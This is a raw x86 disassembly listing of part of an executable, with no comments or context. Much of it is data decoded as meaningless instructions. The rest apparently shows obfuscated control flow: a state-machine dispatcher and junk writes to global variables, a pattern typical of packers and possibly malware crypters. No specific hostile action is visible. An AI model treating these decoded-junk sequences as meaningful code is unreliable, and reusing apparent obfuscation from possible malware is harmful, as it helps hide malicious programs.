  409172:	test   eax,0x1c2a83be
  409177:	inc    eax
  409178:	rcr    BYTE PTR [esi-0x39],0xa5
  40917c:	pop    edx
  40917d:	dec    edi
  40917e:	jecxz  0x4091dc
  409180:	mov    ebx,0x63b997e5
  409185:	add    al,ch
  409187:	push   ebp
  409188:	mov    ds:0xbebd000c,eax
  40918d:	xchg   edx,eax
  40918e:	dec    edx
  40918f:	in     eax,0x77
  409191:	test   esp,esi
  409193:	or     DWORD PTR [esi+edx*1+0x1b],0x6ed08332
  40919b:	mov    ecx,0x56883228
  4091a0:	out    0x3a,al
  4091a2:	mov    eax,0x361d02c8
  4091a7:	xor    ah,dl
  4091a9:	xchg   edi,eax
  4091aa:	dec    edx
  4091ab:	pop    eax
  4091ac:	xor    esi,DWORD PTR [eax+ebp*2+0x5aff3037]
  4091b3:	mov    bl,0x5e
  4091b5:	push   cs
  4091b6:	test   BYTE PTR [edi-0x7cede820],bl
  4091bc:	in     al,dx
  4091bd:	cmp    DWORD PTR [eax+ebp*8-0x60],ebp
  4091c1:	aaa    
  4091c2:	sbb    DWORD PTR [eax-0x14],edi
  4091c5:	mov    eax,0x2bec34ba
  4091ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091cb:	mov    ebx,0xf85cf103
  4091d0:	stos   BYTE PTR es:[edi],al
  4091d1:	rcr    BYTE PTR [ebx],1
  4091d3:	retf   
  4091d4:	xchg   al,cl
  4091d6:	shr    DWORD PTR [ebp-0x61a3015f],cl
  4091dc:	add    BYTE PTR [edi-0x1c],ch
  4091df:	test   al,0xe6
  4091e1:	mov    ebp,0x9f5b4f56
  4091e6:	add    al,0x9f
  4091e8:	cdq    
  4091e9:	sub    esp,0x16423694
  4091ef:	pop    eax
  4091f0:	fwait
  4091f1:	rcr    ecx,cl
  4091f3:	mov    ds:0xcb3b0abb,eax
  4091f8:	out    0x62,al
  4091fa:	sub    DWORD PTR [ebx-0x67],edx
  4091fd:	dec    ecx
  4091fe:	jg     0x40918c
  409200:	rcr    BYTE PTR [eax],cl
  409202:	aad    0xfe
  409204:	in     eax,dx
  409205:	out    dx,eax
  409206:	jnp    0x409226
  409208:	sbb    al,0x71
  40920a:	cmp    eax,0xfa049cde
  40920f:	pop    eax
  409210:	lahf   
  409211:	pop    es
  409212:	cmp    bl,al
  409214:	pop    es
  409215:	mov    edx,0x98cd1b7
  40921a:	test   BYTE PTR [edx-0xc74c32a],0xf0
  409221:	mov    eax,0xb32a9908
  409226:	mov    ebx,0xf41233be
  40922b:	xchg   esi,eax
  40922c:	mov    dh,dl
  40922e:	or     DWORD PTR [ecx+0x39],edx
  409231:	dec    ecx
  409232:	xor    bl,BYTE PTR [esi]
  409234:	mov    dl,0xd7
  409236:	pop    edi
  409237:	icebp  
  409238:	ja     0x409223
  40923a:	mov    eax,ds:0xb5be6ee5
  40923f:	dec    ebp
  409240:	jp     0x409242
  409242:	xor    dh,ch
  409244:	data16 lahf 
  409246:	mov    ds:0xc113ab0d,eax
  40924b:	mov    al,0xf4
  40924d:	or     edx,DWORD PTR [edi-0x31d18a18]
  409253:	mov    ch,0x7b
  409255:	cs iret 
  409257:	add    BYTE PTR [ebp+0x46],dl
  40925a:	mov    ch,0xd5
  40925c:	hlt    
  40925d:	fidivr DWORD PTR [esi-0x5a256833]
  409263:	cmp    DWORD PTR [ebp-0x2b25ef8a],eax
  409269:	xchg   BYTE PTR [ebx+ebx*2-0x42],ch
  40926d:	ins    DWORD PTR es:[edi],dx
  40926e:	sub    BYTE PTR [esp+ebp*2],bh
  409271:	dec    edi
  409272:	int3   
  409273:	push   esi
  409274:	call   0xbd908fef
  409279:	test   DWORD PTR [esi+ebp*4-0x13],esi
  40927d:	jg     0x409287
  40927f:	jmp    0xca18:0xdf4da1f6
  409286:	fstp   TBYTE PTR [ebp+0x5971196a]
  40928c:	into   
  40928d:	pop    esi
  40928e:	jnp    0x409297
  409290:	mov    DWORD PTR [ebx-0x3b1151b0],ebp
  409296:	shr    ecx,cl
  409298:	push   0xbe69280f
  40929d:	out    dx,eax
  40929e:	stos   BYTE PTR es:[edi],al
  40929f:	xlat   BYTE PTR ds:[ebx]
  4092a0:	push   es
  4092a1:	adc    al,0x72
  4092a3:	jge    0x409261
  4092a5:	add    bl,dl
  4092a7:	xor    bh,BYTE PTR [edi]
  4092a9:	push   cs
  4092aa:	xchg   BYTE PTR [esi],cl
  4092ac:	mov    esp,0x8fa841ce
  4092b1:	shr    esi,1
  4092b3:	xchg   ebp,eax
  4092b4:	add    ecx,DWORD PTR [ecx]
  4092b6:	jg     0x409250
  4092b8:	into   
  4092b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092ba:	inc    ebx
  4092bb:	or     eax,ebx
  4092bd:	inc    edx
  4092be:	xchg   DWORD PTR [ebx-0x14],ebp
  4092c1:	jne    0x40926b
  4092c3:	dec    esp
  4092c4:	dec    edi
  4092c5:	jne    0x409305
  4092c7:	push   0xa3c3175d
  4092cc:	adc    DWORD PTR [ecx+esi*8+0x38],0xffffffe0
  4092d1:	xchg   ebp,eax
  4092d2:	dec    esi
  4092d3:	inc    ebp
  4092d4:	dec    ebx
  4092d5:	push   ss
  4092d6:	call   0x32d:0x54343f32
  4092dd:	test   al,0xdd
  4092df:	rcl    BYTE PTR [ebp+0x2],0x56
  4092e3:	ins    DWORD PTR es:[edi],dx
  4092e4:	in     eax,dx
  4092e5:	jmp    0xf323:0x2102de6c
  4092ec:	retf   0x6259
  4092ef:	lods   eax,DWORD PTR ds:[esi]
  4092f0:	mov    eax,ds:0x22863b71
  4092f5:	into   
  4092f6:	xor    cl,cl
  4092f8:	xor    ch,BYTE PTR [ebp-0x65]
  4092fb:	mov    ebp,0xf9233ced
  409300:	jae    0x409349
  409302:	mov    esi,0xad270170
  409307:	cld    
  409308:	mov    esi,0xff2fcbdb
  40930d:	xlat   BYTE PTR ds:[ebx]
  40930e:	rcr    BYTE PTR [ecx+edx*4+0x21],0x8f
  409313:	push   cs
  409314:	dec    esi
  409315:	mov    al,0x40
  409317:	push   ss
  409318:	dec    eax
  409319:	sub    ecx,ebp
  40931b:	stos   DWORD PTR es:[edi],eax
  40931c:	jnp    0x409365
  40931e:	daa    
  40931f:	scas   al,BYTE PTR es:[edi]
  409320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409321:	dec    esp
  409322:	mov    eax,ds:0xa04fcf53
  409327:	js     0x4092c3
  409329:	fwait
  40932a:	ret    0x953b
  40932d:	mov    dl,0x3a
  40932f:	aas    
  409330:	fwait
  409331:	pop    ebp
  409332:	add    al,0x3e
  409335:	cmp    al,BYTE PTR [edx+0x72b7e97f]
  40933b:	sti    
  40933c:	div    DWORD PTR [eax-0x74d08239]
  409342:	inc    ebp
  409343:	in     al,dx
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4335e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	(bad)  
  40939c:	in     al,dx
  40939d:	call   0xeddf5df3
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0xba7c7c7f
  4093a9:	mov    ecx,0xb2eba761
  4093ae:	stos   BYTE PTR es:[edi],al
  4093af:	or     BYTE PTR [ecx+0x2cc661ac],bh
  4093b5:	xchg   BYTE PTR [ecx],al
  4093b7:	int    0xa3
  4093b9:	mov    cl,0xd5
  4093bb:	push   ds
  4093bc:	es jo  0x409351
  4093bf:	data16 jae 0x40934e
  4093c2:	xchg   ebp,eax
  4093c3:	call   0x9fd50ac2
  4093c8:	(bad)  
  4093c9:	pop    ebp
  4093ca:	xchg   ebp,eax
  4093cb:	or     eax,0x566a7f2e
  4093d0:	shl    BYTE PTR [ebp+ebp*8-0x24717be6],cl
  4093d7:	jo     0x409446
  4093d9:	jnp    0x4093df
  4093db:	retf   
  4093dc:	retf   0xdb07
  4093df:	push   0xffffffbc
  4093e1:	in     eax,dx
  4093e2:	inc    ebx
  4093e3:	imul   esp,DWORD PTR ds:0x8dc73331,0xffffffac
  4093ea:	ret    0x8a99
  4093ed:	sub    ebp,esp
  4093ef:	push   edx
  4093f0:	or     DWORD PTR [eax+0x73],0x46
  4093f4:	popf   
  4093f5:	cmp    BYTE PTR [ecx-0x71],ah
  4093f8:	adc    eax,0x75136751
  4093fd:	mov    bl,0x37
  4093ff:	es call ebp
  409402:	jecxz  0x409455
  409404:	inc    edi
  409405:	or     eax,0x35601b90
  40940a:	adc    al,0xc2
  40940c:	fisubr WORD PTR [ecx*4-0x535a2e69]
  409413:	sbb    al,0x1d
  409415:	xchg   edx,eax
  409416:	loope  0x409434
  409418:	(bad)  
  409419:	lds    ebp,FWORD PTR [eax-0x7f]
  40941c:	cmp    cl,dh
  40941e:	sub    eax,DWORD PTR [eax+ebx*4]
  409421:	popf   
  409422:	addr16 pushf 
  409424:	retf   
  409425:	gs jg  0x4093e8
  409428:	ficomp WORD PTR [ecx+0x3e1f4b73]
  40942e:	mov    dl,0xb8
  409430:	hlt    
  409431:	mov    ebx,0xab246bd7
  409436:	sub    al,0xb2
  409438:	sub    eax,0x9f0739af
  40943d:	std    
  40943e:	lahf   
  40943f:	or     ecx,DWORD PTR [eax+0x6b]
  409442:	repz mov WORD PTR [edi+0x63],?
  409446:	xor    ch,BYTE PTR [eax]
  409448:	dec    eax
  409449:	mov    DWORD PTR [ebx+0x6dabf50c],esi
  40944f:	test   al,0xb0
  409451:	jmp    0x6654f053
  409456:	(bad)  
  409457:	lock lds ecx,FWORD PTR ds:0x30460962
  40945e:	sub    al,0x9d
  409460:	mov    ah,ah
  409462:	jg     0x409417
  409464:	test   DWORD PTR [ebp+0x25],ebx
  409467:	mov    ecx,0x509462ce
  40946c:	daa    
  40946d:	iret   
  40946e:	out    0x46,al
  409470:	fstp   TBYTE PTR [edi-0x6aad5442]
  409476:	mov    ss,WORD PTR [esi+0x1c84e444]
  40947c:	pop    edx
  40947d:	push   edx
  40947e:	fistp  WORD PTR [edx-0x7c9381b1]
  409484:	pop    edx
  409485:	xchg   BYTE PTR [ecx+eiz*4+0x38],dl
  409489:	mov    DWORD PTR [edi],ebp
  40948b:	jmp    0xa411:0xa5f71364
  409492:	xor    esp,DWORD PTR [edi]
  409494:	pop    esp
  409495:	mov    ds:0xb637a01d,eax
  40949a:	(bad)  
  40949b:	fisubr DWORD PTR [edx-0x682d0eb9]
  4094a1:	bound  esp,QWORD PTR [eax]
  4094a3:	push   es
  4094a4:	popf   
  4094a5:	jns    0x409462
  4094a7:	dec    esp
  4094a8:	aas    
  4094a9:	call   0x222316a2
  4094ae:	lds    ebp,FWORD PTR [ecx]
  4094b0:	inc    esi
  4094b1:	xor    dl,BYTE PTR [edx+0x33]
  4094b4:	xchg   ecx,eax
  4094b5:	xor    DWORD PTR [ecx+0x60],ecx
  4094b8:	(bad)  
  4094b9:	pop    esi
  4094ba:	(bad)
  4094bd:	push   edx
  4094be:	ror    DWORD PTR [ebx+0xd810845],1
  4094c4:	out    0x35,eax
  4094c6:	inc    ebx
  4094c7:	add    BYTE PTR [eax],bh
  4094c9:	or     al,0x0
  4094cb:	add    BYTE PTR [ebx-0x7f],dl
  4094ce:	adc    eax,0x433557
  4094d3:	inc    edi
  4094d4:	popa   
  4094d5:	add    BYTE PTR [eax],al
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433667,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43355f,0x433557
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43365f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4335ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43355b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4335af,0x43366b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4335af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433567,0x43362f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433597,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4335ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43366b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433563,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43362f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43354b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	push   ss
  4095c2:	pop    ecx
  4095c3:	imul   esp,DWORD PTR [ebx],0xffffffb7
  4095c6:	in     al,dx
  4095c7:	jl     0x409645
  4095c9:	adc    eax,0x717c7c7f
  4095ce:	jns    0x4095c1
  4095d0:	inc    esi
  4095d1:	cmc    
  4095d2:	in     eax,0x4f
  4095d4:	and    esi,edi
  4095d6:	lods   eax,DWORD PTR ds:[esi]
  4095d7:	ror    BYTE PTR ds:0xee5f87e2,1
  4095dd:	popf   
  4095de:	jp     0x409634
  4095e0:	adc    BYTE PTR [ebx],dh
  4095e2:	push   ecx
  4095e3:	loopne 0x4095be
  4095e5:	jbe    0x4095e7
  4095e7:	fwait
  4095e8:	in     eax,0x37
  4095ea:	test   DWORD PTR [edx-0x1e],ebp
  4095ed:	int3   
  4095ee:	add    DWORD PTR [ecx],ebx
  4095f0:	or     ecx,edx
  4095f2:	dec    edi
  4095f3:	fadd   st,st(6)
  4095f5:	popf   
  4095f6:	or     esp,edx
  4095f8:	adc    al,0xc8
  4095fa:	sbb    ah,BYTE PTR [edx]
  4095fc:	lea    esp,[ebp+0x108616b0]
  409602:	fbld   TBYTE PTR [ebp+0x53dfa534]
  409608:	aaa    
  409609:	in     al,dx
  40960a:	inc    esi
  40960b:	dec    ecx
  40960c:	imul   eax,DWORD PTR [esi-0x5b],0xffffff83
  409610:	retf   0xeba9
  409613:	mov    esi,0x79c943f4
  409618:	xor    BYTE PTR [ebx],dl
  40961a:	xchg   BYTE PTR ds:0x7cbfcaca,ah
  409620:	and    BYTE PTR [ecx+ebx*1+0x5822078],bl
  409627:	pushf  
  409628:	push   esi
  409629:	and    al,0x10
  40962b:	pop    edi
  40962c:	mov    edx,ebp
  40962e:	jg     0x409632
  409630:	sbb    DWORD PTR [eax-0x2e785cfe],esp
  409636:	pop    ss
  409637:	ret    
  409638:	enter  0xd3ea,0x1b
  40963c:	push   ebx
  40963d:	mov    bh,0x8c
  40963f:	pop    ss
  409640:	mov    edx,0x315d6eaf
  409645:	stos   BYTE PTR es:[edi],al
  409646:	dec    ebx
  409647:	data16 mov ch,0x86
  40964a:	cwde   
  40964b:	dec    ecx
  40964c:	xor    al,0x9
  40964e:	outs   dx,DWORD PTR ds:[esi]
  40964f:	jnp    0x4096a7
  409651:	cli    
  409652:	pop    edx
  409653:	mov    edx,0x28bdf1f5
  409658:	repz mov WORD PTR [eax+0x34b34b2f],fs
  40965f:	in     al,dx
  409660:	mov    ebx,0x839ea86
  409665:	xchg   ecx,eax
  409666:	add    al,0xa3
  409668:	cmp    BYTE PTR [eax+0x14f2cc8b],bh
  40966e:	cld    
  40966f:	out    dx,al
  409670:	sub    eax,DWORD PTR [ebx-0x64]
  409673:	(bad)  
  409674:	test   al,0x57
  409676:	add    eax,0x6d053ce0
  40967b:	std    
  40967c:	(bad)  
  40967d:	je     0x40961d
  40967f:	mov    edi,0x6d79d3ac
  409684:	scas   al,BYTE PTR es:[edi]
  409685:	nop
  409686:	mov    esp,0x81b7f25c
  40968b:	jmp    0x8b34:0xaf32d2cf
  409692:	repnz mov dl,0xfb
  409695:	hlt    
  409696:	cmp    ebx,DWORD PTR [ecx+0x2fb22c12]
  40969c:	pop    eax
  40969d:	xchg   esi,eax
  40969e:	inc    edi
  40969f:	inc    ecx
  4096a0:	loope  0x4096b1
  4096a2:	xor    eax,0xe17db85b
  4096a7:	pop    es
  4096a8:	aad    0xe3
  4096aa:	mov    bh,0x56
  4096ac:	push   edi
  4096ad:	cmp    edx,DWORD PTR [edx+eax*1+0x643b9079]
  4096b4:	mov    ebx,0x482c0b8b
  4096b9:	add    al,0xa0
  4096bb:	push   ss
  4096bc:	fdiv   DWORD PTR [edx-0x64bf957f]
  4096c2:	ror    DWORD PTR [esi-0x2df998d8],cl
  4096c8:	inc    esi
  4096c9:	jl     0x4096ff
  4096cb:	push   ebx
  4096cc:	fcom   DWORD PTR [edi-0x52]
  4096cf:	mov    edi,0x7d6dd516
  4096d4:	stos   DWORD PTR es:[edi],eax
  4096d5:	lods   eax,DWORD PTR ds:[esi]
  4096d6:	inc    ecx
  4096d7:	inc    eax
  4096d8:	dec    esi
  4096d9:	mov    dl,ah
  4096db:	mov    cl,0x93
  4096dd:	lods   al,BYTE PTR ds:[esi]
  4096de:	push   0xffffff8c
  4096e0:	mov    edi,0x81cc8ef5
  4096e5:	(bad)  
  4096e6:	cmp    eax,0xc7000003
  4096eb:	add    eax,0x4335d7
  4096f0:	xchg   edi,eax
  4096f1:	add    DWORD PTR [eax],eax
  4096f3:	add    BYTE PTR [edi],cl
  4096f5:	test   DWORD PTR [eax+eax*1+0x0],ebp
  4096f9:	add    BYTE PTR [ebx-0x74fff79b],al
  4096ff:	inc    ebp
  409700:	clc    
  409701:	or     DWORD PTR ds:0x433623,0x4335e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433663
  409714:	or     DWORD PTR ds:0x433623,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43353f,0x4335af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433627,0x4335a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43354b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433617,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43355f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4335ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433667,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43353f
  40978d:	and    DWORD PTR ds:0x4335af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43362f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43359f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4335e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433627,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43355f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4335eb,0x433633
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43361b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43355f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4335b3,0x4335af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	mov    cs,WORD PTR [eax]
  409828:	jle    0x4097e4
  40982a:	dec    esp
  40982b:	out    dx,eax
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0xd7c7c7f
  409833:	test   bl,dh
  409835:	sub    al,0x8
  409837:	loope  0x409846
  409839:	sub    dl,al
  40983b:	or     eax,0x5f16f7e4
  409840:	xchg   esi,eax
  409841:	mov    al,0x5e
  409843:	lea    ebp,[edx+edx*4]
  409846:	push   edi
  409847:	inc    edx
  409848:	and    cl,dl
  40984a:	arpl   WORD PTR [ebp-0x2e95ac8d],cx
  409850:	div    DWORD PTR [edi-0x362e0fce]
  409856:	iret   
  409857:	jp     0x40989d
  409859:	shl    BYTE PTR [ecx],0x75
  40985c:	xor    ch,BYTE PTR [edx+0x49]
  40985f:	xchg   ecx,eax
  409860:	(bad)  
  409861:	test   al,0x35
  409863:	add    bl,BYTE PTR [eax+0x7eb69317]
  409869:	sub    DWORD PTR [edi+esi*8-0x44],esi
  40986d:	imul   ebp,edx,0xc8e8ed8f
  409873:	jl     0x409872
  409875:	std    
  409876:	gs out 0xcd,al
  409879:	jmp    0x67c6adf5
  40987e:	rol    DWORD PTR [eax-0x2],0x3a
  409882:	and    edx,edi
  409884:	(bad)  
  409885:	dec    ebx
  409886:	aam    0xea
  409888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409889:	dec    ebp
  40988a:	jg     0x4098f4
  40988c:	test   BYTE PTR [ebp-0x2dacc49],ch
  409892:	adc    DWORD PTR [esi+ecx*1],ebp
  409895:	dec    ecx
  409896:	push   ebx
  409897:	push   esp
  409898:	mov    ebp,0x365b630
  40989d:	jle    0x40986a
  40989f:	rcl    BYTE PTR gs:[esi],cl
  4098a2:	inc    esp
  4098a3:	dec    esi
  4098a4:	ds jne 0x409852
  4098a7:	add    ch,BYTE PTR [esi+0x1c]
  4098aa:	daa    
  4098ab:	cld    
  4098ac:	mov    eax,ds:0x8029f5c
  4098b1:	sub    al,0x29
  4098b3:	sbb    DWORD PTR [edx+0x40fac057],0x3928a6bc
  4098bd:	ss inc esp
  4098bf:	int3   
  4098c0:	ret    
  4098c1:	out    0x69,al
  4098c3:	cvtps2pd xmm5,xmm6
  4098c6:	imul   esi,DWORD PTR [ecx-0x38f1fd17],0x5d6f071b
  4098d0:	ss pop edx
  4098d2:	xor    esi,esi
  4098d4:	outs   dx,DWORD PTR ds:[esi]
  4098d5:	jle    0x409895
  4098d7:	fnstenv [ecx+0x23]
  4098da:	dec    esi
  4098db:	adc    al,0xdb
  4098dd:	sar    DWORD PTR [edx-0x33],cl
  4098e0:	outs   dx,DWORD PTR ds:[esi]
  4098e1:	out    dx,al
  4098e2:	cmp    BYTE PTR [esi+0x2f],bl
  4098e5:	outs   dx,BYTE PTR ds:[esi]
  4098e6:	dec    esi
  4098e7:	inc    edx
  4098e8:	xchg   cx,ax
  4098ea:	in     al,dx
  4098eb:	push   ecx
  4098ec:	dec    ebp
  4098ed:	inc    edi
  4098ee:	mov    WORD PTR [ecx+0x5b],?
  4098f1:	inc    eax
  4098f2:	adc    BYTE PTR [edi],cl
  4098f4:	pop    edx
  4098f5:	pushf  
  4098f6:	mov    esi,DWORD PTR [esi-0x45]
  4098f9:	je     0x40995b
  4098fb:	jbe    0x409968
  4098fd:	sbb    DWORD PTR [esi+0x42c7148],0x4a72d823
  409907:	or     al,0xf1
  409909:	fmul   DWORD PTR [ebp+edi*2+0x1e]
  40990d:	mov    fs,eax
  40990f:	repz sbb BYTE PTR [eax+0x1a40c84a],dh
  409916:	cli    
  409917:	and    cl,BYTE PTR [ecx]
  409919:	dec    esp
  40991a:	add    eax,0xc26c4411
  40991f:	mov    ebx,0xdfc2e4ff
  409924:	or     DWORD PTR ss:[eax+0x75],edi
  409928:	push   ecx
  409929:	gs es retf 
  40992c:	(bad)  
  40992d:	out    dx,eax
  40992e:	xchg   edi,eax
  40992f:	out    0x9f,eax
  409931:	es pusha 
  409933:	sbb    esp,DWORD PTR [edi-0x54e60c06]
  409939:	xor    DWORD PTR [esi],edx
  40993b:	adc    al,0x76
  40993d:	sahf   
  40993e:	push   0x6ba7b58c
  409943:	or     al,0x20
  409945:	push   ecx
  409946:	sbb    esi,DWORD PTR [esi+0x3c633d4]
  40994c:	ret    
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433633
  4099ce:	sub    DWORD PTR ds:0x43353f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4335ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43362f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4335b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43354f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4335e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4335e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4335e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43361b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4335e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4335e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433673,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4335db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433553
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43353f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43353f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43353f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43353f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43353f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43353f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43353f
  409ad6:	dec    edi
